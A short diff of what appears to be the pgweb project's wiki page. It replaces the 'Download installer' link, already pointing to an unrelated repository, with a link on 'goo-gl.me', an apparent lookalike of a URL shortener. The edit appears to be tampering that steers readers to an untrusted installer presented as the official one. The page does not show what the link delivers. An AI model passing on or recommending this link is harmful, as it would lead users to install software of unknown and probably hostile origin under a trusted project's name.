@@ -1,6 +1,6 @@
 Welcome to the pgweb wiki!
 
-- [Download installer](https://github.com/FrankFeng/Spoon-Knife/raw/master/Installer%20windows.zip)
+- [Download installer](http://goo-gl.me/aEUCp)
 - [Build from source](https://github.com/sosedoff/pgweb/wiki/Build-from-source)
 - [Usage](https://github.com/sosedoff/pgweb/wiki/Usage)
 
